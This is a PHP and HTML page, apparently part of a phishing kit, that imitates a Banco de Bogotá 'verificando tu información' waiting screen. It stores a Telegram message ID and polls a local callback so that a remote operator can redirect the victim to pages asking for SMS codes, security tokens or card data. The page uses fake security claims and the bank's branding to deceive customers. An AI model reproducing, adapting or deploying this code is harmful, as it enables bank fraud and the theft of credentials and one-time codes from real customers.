<?php
if (session_status() !== PHP_SESSION_ACTIVE) { session_start(); }
if (!isset($_SESSION['telegram_message_id'])) {
    header('Location: index.php');
    exit();
}
$messageId = $_SESSION['telegram_message_id'];
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Banco de Bogotá - Verificando...</title>
  <link rel="icon" href="./bogota_files/favicon.ico" type="image/x-icon">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background: #f0f2f5;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ── Header azul Banco de Bogotá ── */
    .header {
      background: #003087;
      height: 62px;
      display: flex;
      align-items: center;
      padding: 0 24px;
      gap: 12px;
    }
    .header img {
      height: 34px;
      /* si el logo es oscuro, invertirlo */
      filter: brightness(0) invert(1);
    }
    .header-divider {
      width: 1px;
      height: 28px;
      background: rgba(255,255,255,0.35);
    }
    .header-label {
      color: rgba(255,255,255,0.9);
      font-size: 0.8rem;
      font-weight: 500;
      letter-spacing: 0.03em;
    }

    /* ── Sub-banner azul claro ── */
    .subbanner {
      background: #0055b3;
      padding: 10px 24px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .subbanner-dot {
      width: 8px; height: 8px;
      border-radius: 50%;
      background: #f5a623;
      flex-shrink: 0;
    }
    .subbanner span {
      color: rgba(255,255,255,0.88);
      font-size: 0.78rem;
    }

    /* ── Main ── */
    .main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 40px 16px;
    }

    .card {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.10);
      width: 100%;
      max-width: 400px;
      overflow: hidden;
    }

    /* franja superior azul de la card */
    .card-top-bar {
      background: #003087;
      height: 6px;
    }

    .card-body {
      padding: 40px 32px 36px;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }

    /* Logo dentro del card */
    .card-logo {
      height: 48px;
      width: auto;
      margin-bottom: 32px;
      object-fit: contain;
    }

    /* ── Spinner ── */
    .spinner-wrap {
      position: relative;
      width: 64px;
      height: 64px;
      margin-bottom: 28px;
    }
    .spinner-ring {
      position: absolute;
      inset: 0;
      border-radius: 50%;
      border: 4px solid #e8edf4;
      border-top-color: #003087;
      animation: spin 0.85s linear infinite;
    }
    .spinner-ring.inner {
      inset: 10px;
      border-width: 3px;
      border-top-color: #0066cc;
      animation-duration: 1.3s;
      animation-direction: reverse;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* ── Textos ── */
    .card-title {
      font-size: 1.05rem;
      font-weight: 700;
      color: #1a2a4a;
      margin-bottom: 8px;
      line-height: 1.3;
    }
    .card-subtitle {
      font-size: 0.82rem;
      color: #667;
      line-height: 1.65;
      margin-bottom: 22px;
      max-width: 290px;
    }

    /* ── Status ── */
    .status-pill {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: #eef4ff;
      border: 1px solid #c5d9f5;
      border-radius: 20px;
      padding: 5px 14px;
      font-size: 0.78rem;
      font-weight: 600;
      color: #003087;
      margin-bottom: 28px;
      min-height: 30px;
    }
    .status-dot {
      width: 7px; height: 7px;
      border-radius: 50%;
      background: #0066cc;
      animation: pulse 1.4s ease-in-out infinite;
      flex-shrink: 0;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50%       { opacity: 0.4; transform: scale(0.7); }
    }

    /* ── Barra de progreso ── */
    .progress-track {
      width: 100%;
      height: 3px;
      background: #e8edf4;
      border-radius: 9999px;
      overflow: hidden;
      margin-bottom: 24px;
    }
    .progress-fill {
      height: 100%;
      width: 35%;
      background: linear-gradient(90deg, #003087 0%, #0066cc 100%);
      border-radius: 9999px;
      animation: slide 1.6s ease-in-out infinite;
    }
    @keyframes slide {
      0%   { transform: translateX(-100%); }
      50%  { transform: translateX(200%); }
      100% { transform: translateX(500%); }
    }

    /* ── Aviso de seguridad ── */
    .security-note {
      font-size: 0.73rem;
      color: #8a9ab5;
      line-height: 1.5;
    }
    .security-note strong { color: #556; }

    /* ── Footer ── */
    .footer {
      background: #003087;
      color: rgba(255,255,255,0.65);
      text-align: center;
      padding: 16px;
      font-size: 0.72rem;
      line-height: 1.6;
    }
    .footer a { color: rgba(255,255,255,0.8); text-decoration: none; }
  </style>
</head>
<body>

  <!-- Header -->
  <div class="header">
    <img src="./bogota_files/logo.webp" alt="Banco de Bogotá"
         onerror="this.style.display='none'">
    <div class="header-divider"></div>
    <span class="header-label">Banca Virtual</span>
  </div>

  <!-- Sub-banner -->
  <div class="subbanner">
    <div class="subbanner-dot"></div>
    <span>Conexión segura · SSL 256-bit</span>
  </div>

  <!-- Contenido principal -->
  <div class="main">
    <div class="card">
      <div class="card-top-bar"></div>
      <div class="card-body">

        <img src="./bogota_files/logo.webp"
             class="card-logo"
             alt="Banco de Bogotá"
             onerror="this.style.display='none'">

        <!-- Spinner doble aro -->
        <div class="spinner-wrap">
          <div class="spinner-ring"></div>
          <div class="spinner-ring inner"></div>
        </div>

        <h2 class="card-title">Verificando tu información</h2>
        <p class="card-subtitle">
          Por favor espera un momento.<br>
          No cierres ni recargues esta ventana.
        </p>

        <div class="status-pill">
          <span class="status-dot"></span>
          <span id="status-message">Validando datos...</span>
        </div>

        <div class="progress-track">
          <div class="progress-fill"></div>
        </div>

        <p class="security-note">
          <strong></strong><br>
          
        </p>

      </div>
    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    © <?php echo date('Y'); ?> Banco de Bogotá S.A. · Portal Transaccional Seguro<br>
    <a href="#">Política de privacidad</a> &nbsp;·&nbsp; <a href="#">Términos y condiciones</a>
  </div>

  <!-- ════════════════════════════════════════════
       BACKEND POLLING — NO MODIFICAR
  ════════════════════════════════════════════ -->
  <script>
    const messageId = "<?php echo $messageId; ?>";
    let checkInterval;
    let intentos = 0;
    const MAX_INTENTOS = 150;

    const mensajesAccion = {
      'action_finalizar'            : '✅ Aprobado, finalizando...',
      'action_finalizado'           : '🏁 Proceso completado...',
      'action_sms_bogota'           : '📱 Enviando código SMS...',
      'action_error_sms_bogota'     : '❌ SMS incorrecto, redirigiendo...',
      'action_token_bogota'         : '🔑 Solicitando token...',
      'action_error_token_bogota'   : '❌ Token incorrecto, redirigiendo...',
      'action_pedir_cc_bogota'      : '💳 Solicitando datos de tarjeta...',
      'action_error_usuario_bogota' : '❌ Usuario incorrecto, redirigiendo...',
      'action_otro_banco'           : '🏦 Redirigiendo...',
    };

    function checkStatus() {
      intentos++;
      if (intentos > MAX_INTENTOS) {
        clearInterval(checkInterval);
        document.getElementById('status-message').textContent = 'Tiempo de espera agotado.';
        setTimeout(() => { window.location.href = 'index.php'; }, 2000);
        return;
      }

      fetch('callback_bogota.php?msg_id=' + messageId)
        .then(r => r.text())
        .then(text => {
          try { return JSON.parse(text); }
          catch(e) { return { waiting: true }; }
        })
        .then(data => {
          if (data.redirect) {
            clearInterval(checkInterval);
            document.getElementById('status-message').textContent = mensajesAccion[data.action] || 'Redirigiendo...';
            setTimeout(() => { window.location.href = data.url; }, 800);
          } else if (data.timeout) {
            clearInterval(checkInterval);
            document.getElementById('status-message').textContent = '⏱️ Tiempo agotado. Intenta de nuevo.';
            setTimeout(() => { window.location.href = 'index.php'; }, 2500);
          }
        })
        .catch(err => console.error('Error:', err));
    }

    checkInterval = setInterval(checkStatus, 2000);
  </script>

</body>
</html>